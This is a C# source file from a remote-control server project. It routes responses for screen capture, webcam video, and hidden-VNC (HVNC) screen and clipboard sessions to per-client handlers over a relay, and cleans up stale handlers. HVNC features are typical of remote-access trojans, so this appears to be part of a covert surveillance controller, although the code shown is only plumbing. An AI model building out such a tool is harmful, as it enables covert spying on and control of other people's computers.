using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;
namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private void HandleCapturePackets(PacketReceivedEventArgs e)
        {
            if (e.PacketType == ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE)
            {
                var handler = FindHandler(sessionScreenHandlers, e.Session.SocketId);
                if (handler != null)
                    handler(e.Obj as ResponseStartGetScreen);
            }
            else if (e.PacketType == ePacketType.PACKET_HVNC_SCREEN_RESPONSE)
            {
                var handler = FindHandler(sessionHVNCScreenHandlers, e.Session.SocketId);
                if (handler != null)
                    handler(e.Obj as ResponseHVNCScreen);
            }
            else if (e.PacketType == ePacketType.PACKET_HVNC_START_RESPONSE)
            {
                var handler = FindHandler(sessionHVNCStartHandlers, e.Session.SocketId);
                if (handler != null)
                    handler(e.Obj as ResponseHVNCStart);
            }
            else if (e.PacketType == ePacketType.PACKET_HVNC_CLIPBOARD_GET_RESPONSE)
            {
                var handler = FindHandler(sessionHVNCClipboardHandlers, e.Session.SocketId);
                if (handler != null)
                    handler(e.Obj as ResponseClipboardGet);
            }
            else if (e.PacketType == ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE)
            {
                var handler = FindHandler(sessionVideoHandlers, e.Session.SocketId);
                if (handler != null)
                    handler(e.Obj as ResponseStartCaptureVideo);
            }
        }

        /// <summary>
        /// 查找handler：先按sessionId精确匹配，找不到时fallback到字典中唯一注册的handler。
        /// 解决relay架构中_currentClientId变化导致响应路由失败的问题。
        /// </summary>
        private T FindHandler<T>(Dictionary<string, T> handlers, string sessionId) where T : class
        {
            if (handlers.Count == 0)
                return null;
            T handler;
            if (handlers.TryGetValue(sessionId, out handler))
                return handler;
            // Fallback: 当只有一个注册的handler时直接使用它
            if (handlers.Count == 1)
            {
                foreach (var kv in handlers)
                    return kv.Value;
            }
            // 多个handler时无法确定目标，记录日志
            Logger.Debug("HandleCapturePackets fallback failed: sessionId=" + sessionId +
                " handlers=" + handlers.Count);
            return null;
        }

        /// <summary>
        /// 清理sessionVideoHandlers中指向已关闭/释放窗体的stale条目
        /// </summary>
        private void CleanupStaleVideoHandlers()
        {
            var staleKeys = new List<string>();
            foreach (var kv in sessionVideoHandlers)
            {
                if (kv.Value == null) { staleKeys.Add(kv.Key); continue; }
                var target = kv.Value.Target as Form;
                if (target != null && target.IsDisposed)
                    staleKeys.Add(kv.Key);
            }
            foreach (var key in staleKeys)
                sessionVideoHandlers.Remove(key);
        }
    }
}
